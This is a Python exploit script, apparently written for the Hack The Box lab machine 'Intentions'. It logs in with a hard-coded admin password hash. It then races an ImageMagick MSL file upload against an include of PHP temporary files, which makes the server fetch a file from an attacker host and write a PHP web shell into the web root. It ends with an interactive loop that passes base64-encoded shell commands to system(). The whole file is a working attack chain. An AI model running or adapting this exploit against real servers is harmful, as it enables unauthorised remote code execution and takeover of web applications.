#!/usr/bin/env python3

import requests
import threading
import base64

local_url = "http://10.10.14.129:443"
target_url = "http://10.10.11.220"
admin_email = "steve@intentions.htb"
admin_hash = "$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"

login_url = target_url + "/api/v2/auth/login"
json = {"email":admin_email,"hash":admin_hash}
s = requests.session()
s.post(login_url, json=json)

msl_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://10.10.14.129:8000/lol.png" />
<write filename="/var/www/html/intentions/public/lol.php" />
</image>'''

files = {"lol":("lol.msl", msl_file)}
def create_msl_on_temp():
    url = target_url + "/api/v2/admin/image/modify"
    s.post(url, files=files)

json = {
    'path': 'vid:msl:/tmp/php*',
    'effect': 'lol'
}
def try_include():
    url = target_url + "/api/v2/admin/image/modify"
    s.post(url, json=json)

threads = []
for i in range(30):
	threads.append(threading.Thread(target=create_msl_on_temp))
	threads.append(threading.Thread(target=try_include))

for t in threads:
	t.start()
for t in threads:
	t.join()

while True:
	try:
		cmd = input("cmd> ")
		cmd = base64.b64encode(cmd.rstrip().encode()).decode()
		data = {
	    	"a":f"""system("echo {cmd} | base64 -d | bash");"""
		}
		payload_url = target_url + "/lol.php"
		r = requests.post(payload_url, data=data)
		print(r.text.split("Copyright")[1].encode().split(b"\n6\x11\xef\xbf")[0].decode())
	except KeyboardInterrupt:
		exit(0)
